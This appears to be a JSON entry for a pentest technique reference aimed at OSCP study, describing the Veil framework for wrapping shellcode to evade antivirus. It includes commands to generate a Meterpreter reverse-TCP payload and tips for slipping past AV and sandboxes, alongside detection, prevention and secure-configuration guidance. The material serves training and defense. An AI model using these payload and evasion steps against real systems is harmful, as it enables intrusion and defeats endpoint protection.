@@ -1,0 +1,88 @@
+{
+  "id": "veil-payload-gen",
+  "name": "Veil - On-Disk AV Evasion Payload",
+  "command": "sudo veil",
+  "description": "Veil is a standalone framework that wraps shellcode in Python, PowerShell, C, and other language templates to defeat signature-based AV on disk. Where msfvenom -e is now reliably caught, Veil's language-native wrappers (and its use of OS-native interpreters to run the payload) can survive. On the OSCP exam Veil is an allowed standalone tool \u2014 not a Metasploit module.",
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "veil"
+  ],
+  "tags": [
+    "av-evasion",
+    "on-disk",
+    "veil",
+    "payload",
+    "obfuscation"
+  ],
+  "category": "Exploitation",
+  "subcategory": "AV Evasion",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 14: Antivirus Evasion",
+  "examples": [
+    {
+      "label": "Launch Veil",
+      "command": "sudo veil"
+    },
+    {
+      "label": "List available Evasion payloads",
+      "command": "use 1\nlist"
+    },
+    {
+      "label": "Generate a Python payload (Ordeal example)",
+      "command": "use python/meterpreter/rev_tcp\nset LHOST 192.168.49.128\nset LPORT 443\ngenerate"
+    }
+  ],
+  "notes": "Veil has two tools: Evasion (generates AV-evading payloads) and Ordeal (obfuscates shellcode). Pick a language template that fits the target - Python and PowerShell templates require those interpreters on the victim but tend to evade well; C templates produce a standalone EXE. Veil still embeds shellcode internally, so behavioral/heuristic detection can still flag the API call sequence (VirtualAlloc + CreateThread) - pair with in-memory techniques for hardened targets. Test every generated artifact on antiscan.me (not VirusTotal) before deploying. Install on Kali: `sudo apt install veil` (or `/usr/share/veil/config/setup.sh --force --silent` on older setups). Also covered in: OSCP PEN-200 Chapter 14 (Antivirus Evasion).",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Antivirus Evasion",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "Veil Framework GitHub",
+      "url": "https://github.com/Veil-Framework/Veil"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "av-evasion-methods",
+      "rel": "prereq",
+      "note": "Understand what detection layer Veil is bypassing before picking a template."
+    },
+    {
+      "id": "powershell-shellcode-runner",
+      "rel": "alternative",
+      "note": "Fully in-memory: no file written, beats on-disk scanning entirely."
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1027",
+    "T1588.005"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Veil generates shellcode wrappers in Python, C, Ruby, or PowerShell that embed Metasploit shellcode (or custom shellcode) and decrypt/execute it at runtime. By encoding the shellcode (XOR, AES) and varying the wrapper language and structure, Veil produces executables that evade signature-based AV that only scans for known Metasploit shellcode byte patterns. The generated executable decodes the shellcode in memory and executes it.",
+    "prerequisites": "Veil framework installed on Kali. Metasploit shellcode or custom shellcode. Target architecture (x86/x64). Target OS. Understanding of which AV product is on the target (test against it specifically).",
+    "impact": "T1027 Obfuscated Files or Information + T1588.005 Obtain Capabilities: Exploits. Produces executables that bypass signature-based AV to deliver shellcode (Meterpreter, custom C2 beacon). Enables initial access or post-exploitation on endpoints with AV.",
+    "detection": "AMSI: PowerShell-wrapper Veil payloads scanned by AMSI in-memory. Behavioral EDR: shellcode injection pattern from a newly created executable. Memory scan: Meterpreter shellcode patterns in process memory post-injection. VirusTotal / cloud AV: known Veil output patterns are signatured. Executable anomalies: no PE sections, unusual entropy (encrypted payload = high entropy).\nScript execution or suspicious parent processes correlated with creation/modification of encoded, compressed, or encrypted file formats (.zip, .7z, .enc) and abnormal command-line syntax or PowerShell obfuscation (DET0378/AN1064).\nUse of gzip, base64, tar, or openssl in scripts or commands that encode/encrypt files after file staging or system enumeration (AN1065).\nArchive or encryption tools (zip, openssl) tied to user-scripted activity or binaries writing encrypted output files (AN1066).",
+    "artifacts": "EDR alert: shellcode injection from non-standard process | AMSI block event | High-entropy executable detected by AV | Memory scan: Meterpreter shellcode in process memory | Network: Meterpreter C2 traffic pattern (SSL + specific handshake)",
+    "prevention": "EDR with behavioral detection \u2014 Veil payloads evade signature AV but behavioral EDR catches shellcode injection. AMSI for PowerShell wrappers. Application control (WDAC) prevents unknown executables. Network inspection for Meterpreter C2 protocol patterns. Email/web gateway malware scanning.\nAntivirus/Antimalware: Use AMSI on Windows 10+ to analyze commands after being processed/interpreted; auto-quarantine suspicious encoded files.\nAudit: Periodically review common fileless storage locations (Registry, WMI repository) for abnormal and malicious data.\nBehavior Prevention on Endpoint: Enable Windows 10+ ASR rules to prevent execution of potentially obfuscated payloads.",
+    "evasion": "Use custom shellcode (not Meterpreter) \u2014 avoids Meterpreter-specific signatures. Combine Veil with sleep+jitter and anti-sandbox. Generate for specific AV and test before delivery. Use process hollowing or injection rather than direct shellcode execution (different behavioral signature).",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1027/",
+      "https://attack.mitre.org/techniques/T1588/005/"
+    ],
+    "misconfiguration": "Signature-only AV without behavioral detection. AMSI not enabled. Application control not deployed. No network C2 traffic detection.",
+    "vulnerable_config": "# Signature-only AV (Windows Defender without EDR):\nGet-MpComputerStatus | Select-Object AMRunningMode\n# AMRunningMode: Normal = signature only, no EDR component\n\n# No application control:\n# Any unsigned executable runs without restriction",
+    "secure_config": "# Application control via WDAC:\n# Start with audit mode policy, monitor unsigned binaries for 30 days\n# Then enforce: only signed/allowed binaries execute\nNew-CIPolicy -Level Publisher -FilePath C:\\Policy\\BasePolicy.xml -UserPEs\nConvertFrom-CIPolicy C:\\Policy\\BasePolicy.xml C:\\Windows\\System32\\CodeIntegrity\\SIPolicy.p7b\n\n# EDR behavioral detection:\n# Defender for Endpoint P2 includes: process injection detection, memory scanning\n# CrowdStrike Falcon: detects shellcode injection patterns regardless of obfuscation"
+  }
+}
